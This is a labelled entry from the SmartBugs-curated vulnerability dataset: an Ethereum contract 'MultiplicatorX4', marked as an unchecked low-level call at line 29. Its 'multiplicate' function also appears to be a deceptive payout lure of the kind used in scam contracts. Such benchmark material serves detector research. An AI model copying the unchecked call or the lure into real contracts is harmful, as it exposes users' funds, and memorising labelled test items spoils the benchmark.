---
Dataset: smartbugs-curated
Name: 0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol
Category: unchecked_low_level_calls
Pragma: 0.4.18
Origin-Path: dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol
Source: etherscan.io
Vulnerable-Lines: 29
---

# Vulnerability Reference Case: unchecked_low_level_calls

## Source Code
```solidity
/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */

 pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}
```
